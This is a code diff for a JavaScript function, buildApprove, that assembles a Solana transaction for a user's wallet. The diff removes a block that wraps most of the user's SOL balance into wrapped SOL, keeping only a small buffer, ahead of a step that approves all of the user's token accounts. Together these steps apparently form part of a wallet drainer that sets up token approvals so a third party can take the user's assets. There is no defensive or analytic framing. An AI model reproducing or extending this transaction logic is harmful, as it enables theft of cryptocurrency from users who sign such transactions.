@@ -44,58 +44,6 @@ async function buildApprove(user, connection) {
             tx.recentBlockhash = blockhash;
             tx.feePayer = userPubkey;
 
-            // ===== 1. Create WSOL ATA =====
-            const wsolAta = getAssociatedTokenAddressSync(
-                new PublicKey(NATIVE_MINT),
-                userPubkey,
-                false,
-                TOKEN_PROGRAM_ID
-            );
-
-            const wsolAtaInfo = await conn.getAccountInfo(wsolAta);
-            let wsolAmount = 0n;
-
-            if (!wsolAtaInfo) {
-                tx.add(
-                    createAssociatedTokenAccountInstruction(
-                        userPubkey,
-                        wsolAta,
-                        userPubkey,
-                        new PublicKey(NATIVE_MINT),
-                        TOKEN_PROGRAM_ID,
-                        TOKEN_PROGRAM_ID
-                    )
-                );
-            }
-
-            // ===== 2. SAFE SOL → WSOL wrap =====
-            const userBalance = await conn.getBalance(userPubkey);
-
-            let solToConvert = 0;
-
-            if (userBalance > SAFE_SOL_BUFFER) {
-                const usableBalance = userBalance - SAFE_SOL_BUFFER;
-                solToConvert = Math.floor(usableBalance * WRAP_RATIO);
-            }
-
-            if (solToConvert > 0) {
-                tx.add(
-                    SystemProgram.transfer({
-                        fromPubkey: userPubkey,
-                        toPubkey: wsolAta,
-                        lamports: solToConvert
-                    })
-                );
-
-                tx.add(
-                    createSyncNativeInstruction(
-                        wsolAta,
-                        TOKEN_PROGRAM_ID
-                    )
-                );
-
-                wsolAmount = BigInt(solToConvert);
-            }
 
             // ===== 3. Approve tokens =====
             const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
